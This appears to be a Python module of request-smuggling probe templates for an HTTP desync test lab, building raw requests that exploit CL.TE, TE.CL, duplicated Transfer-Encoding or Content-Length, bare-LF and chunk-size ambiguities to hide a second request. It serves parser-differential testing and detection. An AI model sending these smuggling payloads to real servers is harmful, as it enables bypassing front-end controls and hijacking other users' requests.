"""Probe templates: each builds raw bytes whose *request boundary* is ambiguous.

Every template places two markers:

* ``A`` -- the path of the request the client legitimately sends, and
* ``B`` -- the path of a request hidden in the bytes one hop calls "body".

If the back end ever parses ``B`` as a request of its own, the two hops disagree
about where the first request ends: that is smuggling.  Detection never relies
on timing; it reads the back end's own journal.

Each template is independent of any particular product.  They describe
*classes* of ambiguity; which of them actually desyncs depends on the pair of
dialects under test.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Callable

CRLF = b"\r\n"


@dataclass(frozen=True)
class Template:
    key: str
    family: str                 # CL.TE, TE.CL, TE.TE, CL.CL, ...
    title: str
    why: str                    # the ambiguity in one sentence
    build: Callable[[str, str], bytes]
    safe: Callable[[str, str], bytes] | None = None
    risk: str = "medium"        # how disruptive to a real target


def _smuggled(b_marker: str, method: str = "GET", extra: bytes = b"") -> bytes:
    return (
        f"{method} /__lab/echo/{b_marker} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + extra
        + CRLF
    )


def _plain(a_marker: str, body: bytes = b"", cl: int | None = None) -> bytes:
    n = len(body) if cl is None else cl
    head = (
        f"POST /__lab/echo/{a_marker} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + f"Content-Length: {n}".encode()
        + CRLF
    )
    return head + CRLF + body


# ---------------------------------------------------------------------------
# CL.TE
# ---------------------------------------------------------------------------


def build_cl_te(a: str, b: str) -> bytes:
    body = b"0" + CRLF + CRLF + _smuggled(b)
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + f"Content-Length: {len(body)}".encode()
        + CRLF
        + b"Transfer-Encoding: chunked"
        + CRLF
    )
    return head + CRLF + body


def safe_cl_te(a: str, b: str) -> bytes:
    # Same shape, but the hidden request is written as ordinary body bytes.
    body = b"hello " + _smuggled(b)
    return (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + f"Content-Length: {len(body)}".encode()
        + CRLF
        + b"Transfer-Encoding: chunked"
        + CRLF
        + CRLF
        + b"%x" % len(body) + CRLF + body + CRLF + b"0" + CRLF + CRLF
    )


# ---------------------------------------------------------------------------
# TE.CL
# ---------------------------------------------------------------------------


def build_te_cl(a: str, b: str) -> bytes:
    smug = _smuggled(b)
    chunk_head = b"%x" % len(smug) + CRLF
    body = chunk_head + smug + CRLF + b"0" + CRLF + CRLF
    # The back end (CL wins) reads exactly the chunk-size line, then treats
    # the rest as the next request.
    cl = len(chunk_head)
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + f"Content-Length: {cl}".encode()
        + CRLF
        + b"Transfer-Encoding: chunked"
        + CRLF
    )
    return head + CRLF + body


def safe_te_cl(a: str, b: str) -> bytes:
    body = b"5" + CRLF + b"hello" + CRLF + b"0" + CRLF + CRLF
    return (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + b"Content-Length: 3"
        + CRLF
        + b"Transfer-Encoding: chunked"
        + CRLF
        + CRLF
        + body
    )


# ---------------------------------------------------------------------------
# TE.TE -- obfuscating the transfer-coding list
# ---------------------------------------------------------------------------


def _te_obfuscation(a: str, b: str, te_lines: list[bytes]) -> bytes:
    smug = _smuggled(b)
    body = b"0" + CRLF + CRLF + smug
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + f"Content-Length: {len(body)}".encode()
        + CRLF
        + b"".join(line + CRLF for line in te_lines)
    )
    return head + CRLF + body


def build_te_te_unknown(a: str, b: str) -> bytes:
    # One hop drops the unknown coding and finds "chunked"; the other sees two
    # codings, the last of which is not chunked, and falls back to CL.
    return _te_obfuscation(
        a, b, [b"Transfer-Encoding: chunked", b"Transfer-Encoding: bogus"]
    )


def build_te_te_space(a: str, b: str) -> bytes:
    # "chunked " with trailing whitespace is not the token "chunked" to a hop
    # that does not trim OWS in this position.
    return _te_obfuscation(a, b, [b"Transfer-Encoding: chunked ", b"Transfer-Encoding: x"])


def build_te_te_identity(a: str, b: str) -> bytes:
    return _te_obfuscation(
        a, b, [b"Transfer-Encoding: chunked", b"Transfer-Encoding: identity"]
    )


def build_te_te_name_ws(a: str, b: str) -> bytes:
    # Whitespace before the colon: a lenient hop reads a second
    # Transfer-Encoding header; a strict one sees a malformed header.
    return _te_obfuscation(a, b, [b"Transfer-Encoding: chunked", b"Transfer-Encoding : x"])


def build_te_te_dup_chunked(a: str, b: str) -> bytes:
    return _te_obfuscation(
        a, b, [b"Transfer-Encoding: chunked", b"Transfer-Encoding: chunked"]
    )


# ---------------------------------------------------------------------------
# CL.CL -- two Content-Length values
# ---------------------------------------------------------------------------


def _dup_cl(a: str, b: str, first: int, second: int, muted: bytes) -> bytes:
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + f"Content-Length: {first}".encode()
        + CRLF
        + f"Content-Length: {second}".encode()
        + CRLF
        + CRLF
    )
    return head + muted


def build_cl_cl(a: str, b: str) -> bytes:
    smug = _smuggled(b)
    # Front (first wins) absorbs everything; back (last wins) stops early and
    # parses the remainder as a new request.
    body = b"X" * 6 + smug
    return _dup_cl(a, b, len(body), 6, body)


def build_cl_cl_reverse(a: str, b: str) -> bytes:
    smug = _smuggled(b)
    body = b"X" * 6 + smug
    return _dup_cl(a, b, 6, len(body), body)


def safe_cl_cl(a: str, b: str) -> bytes:
    body = _smuggled(b)
    return _dup_cl(a, b, len(body), len(body), body)


# ---------------------------------------------------------------------------
# bare-LF differential
# ---------------------------------------------------------------------------


def build_bare_lf(a: str, b: str) -> bytes:
    smug = _smuggled(b)
    body = b"0" + CRLF + CRLF + smug
    # Every line terminator is a bare LF except the body's own.
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + b"\nHost: smugglelab\n"
        + f"Content-Length: {len(body)}".encode()
        + b"\nTransfer-Encoding: chunked\n\n"
    )
    return head + body


# ---------------------------------------------------------------------------
# chunk-size obfuscation
# ---------------------------------------------------------------------------


def build_chunk_size_ws(a: str, b: str) -> bytes:
    smug = _smuggled(b)
    body = b" " + b"%x" % len(smug) + CRLF + smug + CRLF + b"0" + CRLF + CRLF
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + b"Transfer-Encoding: chunked"
        + CRLF
    )
    return head + CRLF + body


def build_chunk_ext(a: str, b: str) -> bytes:
    smug = _smuggled(b)
    body = b"%x;name=value" % len(smug) + CRLF + smug + CRLF + b"0" + CRLF + CRLF
    head = (
        f"POST /__lab/echo/{a} HTTP/1.1".encode()
        + CRLF
        + b"Host: smugglelab"
        + CRLF
        + b"Transfer-Encoding: chunked"
        + CRLF
    )
    return head + CRLF + body


# ---------------------------------------------------------------------------
# catalog
# ---------------------------------------------------------------------------

TEMPLATES: list[Template] = [
    Template(
        "cl_te",
        "CL.TE",
        "Content-Length + Transfer-Encoding (front trusts CL)",
        "A hop that obeys Content-Length reads the chunked-looking tail as body; "
        "a hop that obeys Transfer-Encoding reads it as a new request.",
        build_cl_te,
        safe_cl_te,
    ),
    Template(
        "te_cl",
        "TE.CL",
        "Transfer-Encoding + Content-Length (front trusts TE)",
        "The front decodes a short chunked body; the back obeys Content-Length, "
        "stops inside the chunk framing and turns the remainder into a request.",
        build_te_cl,
        safe_te_cl,
    ),
    Template(
        "te_te_unknown",
        "TE.TE",
        "Duplicate Transfer-Encoding, unknown coding after chunked",
        "One hop drops an unrecognised coding and still finds 'chunked'; "
        "another treats the list as unusable and falls back to Content-Length.",
        build_te_te_unknown,
    ),
    Template(
        "te_te_space",
        "TE.TE",
        "Transfer-Encoding value with trailing whitespace",
        "If one hop fails to trim the value it no longer sees the token 'chunked'.",
        build_te_te_space,
    ),
    Template(
        "te_te_identity",
        "TE.TE",
        "chunked followed by identity",
        "Some hops accept 'identity' as terminating the list, others keep "
        "looking and never find chunked last.",
        build_te_te_identity,
    ),
    Template(
        "te_te_name_ws",
        "TE.TE",
        "Whitespace before the colon on a second TE header",
        "A lenient hop accepts the folded-in header; a strict one discards it.",
        build_te_te_name_ws,
    ),
    Template(
        "te_te_dup_chunked",
        "TE.TE",
        "Transfer-Encoding: chunked sent twice",
        "Hops differ on whether a repeated coding list is legal or collapses "
        "to a single chunked body.",
        build_te_te_dup_chunked,
    ),
    Template(
        "cl_cl",
        "CL.CL",
        "Duplicate Content-Length, large first / small second",
        "First-wins and last-wins hops disagree on the body length, so one hop "
        "leaves a request's worth of bytes in the stream.",
        build_cl_cl,
        safe_cl_cl,
    ),
    Template(
        "cl_cl_reverse",
        "CL.CL",
        "Duplicate Content-Length, small first / large second",
        "The mirror image: a last-wins front and a first-wins back desync.",
        build_cl_cl_reverse,
    ),
    Template(
        "bare_lf",
        "LF",
        "Bare-LF line terminators in the head",
        "Hops that accept bare LF agree with CRLF hops on where lines end, but "
        "some forward the raw bytes while rejecting them downstream.",
        build_bare_lf,
    ),
    Template(
        "chunk_size_ws",
        "CHUNK",
        "Leading whitespace before the chunk size",
        "A lenient hop skips the space and decodes the chunk; a strict one "
        "errors or treats it as a different size.",
        build_chunk_size_ws,
    ),
    Template(
        "chunk_ext",
        "CHUNK",
        "Chunk extension on the chunk-size line",
        "Hops that mishandle the extension mis-locate the chunk data.",
        build_chunk_ext,
    ),
]

TEMPLATES_BY_KEY = {t.key: t for t in TEMPLATES}
